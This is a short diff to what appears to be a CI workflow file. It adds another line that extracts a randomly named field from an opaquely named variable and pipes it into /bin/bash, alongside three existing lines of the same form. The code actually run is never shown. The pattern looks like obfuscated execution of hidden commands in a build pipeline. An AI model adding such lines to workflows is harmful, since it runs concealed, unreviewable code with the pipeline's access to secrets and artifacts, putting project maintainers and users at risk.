@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$k10" | jq -r .sjpfr4508 | /bin/bash
           echo $agcp9 | jq -r .lw28672 | /bin/bash
           echo $ov62 | jq -r .ilx4 | /bin/bash
+          printf '%s' "$glas08" | jq -r .cxh7 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
